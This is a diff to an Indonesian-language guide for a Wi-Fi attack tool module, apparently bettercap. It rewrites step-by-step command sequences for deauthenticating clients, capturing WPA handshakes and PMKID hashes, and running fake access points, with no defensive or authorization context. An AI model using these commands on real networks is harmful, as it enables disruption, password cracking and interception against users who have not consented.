@@ -54,33 +54,54 @@ Modul `wifi` digunakan untuk **memantau dan menyerang jaringan Wi-Fi 802.11 seca
 wifi.recon on
 ```
 
-### 2. Serang dengan Deauth Semua Klien
+### 2. Capture 4-Way Handshake
 
 ```
-wifi.deauth ff:ff:ff:ff:ff:ff
+set wifi.handshakes.file <lokasi_simpan>
+set wifi.handshakes.aggregate true
+wifi.recon on
+wifi.recon.channel <Channel_WiFi>
+wifi.show
+wifi.deauth <BSSID_WiFi>
+
+# Kalo mau single client/target
+wifi.deauth <MAC_Client> <BSSID_WiFi>
 ```
+
+> **Catatan**: Kalo mau kustom lokasi simpan hasil capture 4-Way Handshake-nya jangan jalankan `wifi.recon on` dulu, tapi seting dulu `set wifi.handshakes.file <lokasi_simpan>`, terus baru `wifi.reco on`. Samakan saja seperti contoh diatas.
+
 
 ### 3. Buat Access Point Palsu
 
-```
-set wifi.ap.ssid FreePublicWiFi
-set wifi.ap.encryption false
-wifi.ap
-```
+1. Tanpa Password:
 
-### 4. Serang PMKID untuk Hash WPA2
+   ```
+   set wifi.ap.ssid <SSID_WiFi>
+   set wifi.ap.encryption false
+   wifi.ap
+   ```
+
+2. Menggunakan Password:
+
+   ```
+   set wifi.ap.ssid <SSID_WiFi>
+   set wifi.ap.encryption wpa2
+   set wifi.ap.key <password>
+   wifi.ap
+   ```
+
+### 4. Capture PMKID WPA2 Hash
 
 ```
-wifi.assoc ff:ff:ff:ff:ff:ff
-```
-
-### 5. Simpan Hasil Handshake
-
-```
-set wifi.handshakes.file /tmp/hasil-handshake.pcap
+set wifi.handshakes.file <lokasi_simpan>
 set wifi.handshakes.aggregate true
-wifi.assoc *
+wifi.recon on
+wifi.recon.channel <channel_WiFi>
+wifi.show
+wifi.assoc <BSSID_WiFi>
 ```
+
+> **Catatan**: Kalo mau kustom lokasi simpan hasil capture PMKID WPA2 Hash-nya jangan jalankan `wifi.recon on` dulu, tapi seting dulu `set wifi.handshakes.file <lokasi_simpan>`, terus baru `wifi.reco on`. Samakan saja seperti contoh diatas.
 
 ### F. Fitur Advanced Filtering
 
